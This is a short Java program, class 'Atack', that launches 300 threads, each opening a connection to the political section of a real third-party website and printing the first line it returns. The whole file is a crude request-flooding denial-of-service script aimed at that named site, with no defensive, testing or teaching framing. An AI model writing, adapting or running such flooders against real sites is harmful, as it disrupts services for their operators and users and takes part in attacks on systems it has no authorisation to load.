package httpserver2;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

public class Atack {

	public static void main(String[] args) throws Exception {

		for (int i = 0; i < 300; i++) {

			new Thread(() -> {

				try {

					String path = "http://www.ilbe.com/politics";

					URL url = new URL(path);

					Scanner scanner = new Scanner(url.openStream());

					System.out.println(scanner.nextLine());
					System.out.println("-----------------");
					scanner.close();
				} catch (Exception e) {
					System.out.println(e.getMessage());
				}

			}).start();

		}

	}

}
